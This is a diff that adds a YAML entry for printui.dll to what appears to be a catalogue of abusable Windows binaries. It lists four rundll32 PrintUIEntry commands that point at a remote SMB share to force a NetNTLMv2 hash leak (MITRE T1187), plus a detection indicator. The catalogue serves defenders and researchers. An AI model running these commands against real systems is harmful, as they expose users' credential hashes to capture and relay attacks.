@@ -1,0 +1,48 @@
+---
+Name: printui.dll
+Description: Printer Settings User Interface
+Author: Benjamin Lim
+Created: 6 Sep 2021
+Commands:
+  - Command: rundll32.exe printui.dll,PrintUIEntry /s /t1 /c\\1.2.3.4\printer
+    Description: Run printer properties for a network printer.
+    Usecase: A SMB connection will be created to the remote location, causing NetNTLMv2 challenge hash to be sent in the process.
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
+    OperatingSystem: Windows 8, Windows 8.1, Windows 10
+  - Command: rundll32.exe printui.dll, PrintUIEntry /ia /m "Brother DCP-128C" /K /h x64 /v 3 /f "\\1.2.3.4\printer1"
+    Description: Run inf install for printer1 with inf file located on a remote share.
+    Usecase: A SMB connection will be created to the remote location, causing NetNTLMv2 challenge hash to be sent in the process.
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
+    OperatingSystem: Windows 8, Windows 8.1, Windows 10
+  - Command: rundll32.exe printui.dll,PrintUIEntry /ia /c\\1.2.3.4\printer2 /m "Brother DCP-128C" /h "x86" /v "Type 3 - User Mode" /f c:\infpath\infFile.inf
+    Description: Add printer driver for printer2 using inf file located on a remote share.
+    Usecase: A SMB connection will be created to the remote location, causing NetNTLMv2 challenge hash to be sent in the process.
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
+    OperatingSystem: Windows 8, Windows 8.1, Windows 10
+  - Command: rundll32.exe printui.dll,PrintUIEntry /Ss /n "Fax" /a "\\1.2.3.4\printer3"
+    Description: Store printer settings for printer named "Fax" onto a remote share.
+    Usecase: A SMB connection will be created to the remote location, causing NetNTLMv2 challenge hash to be sent in the process. Prerequisites: System must have a printer named "Fax".
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
+    OperatingSystem: Windows 8, Windows 8.1, Windows 10    
+Full_Path:
+  - Path: c:\windows\system32\printui.dll
+Detection: 
+  - IOC: SMB traffic from PID 4 to Internet destination 
+Resources:
+  - Link: https://limbenjamin.com/articles/lolbin-printui.html
+Acknowledgement:
+  - Person: Benjamin Lim
+    Handle: @limbenjamincom
+---
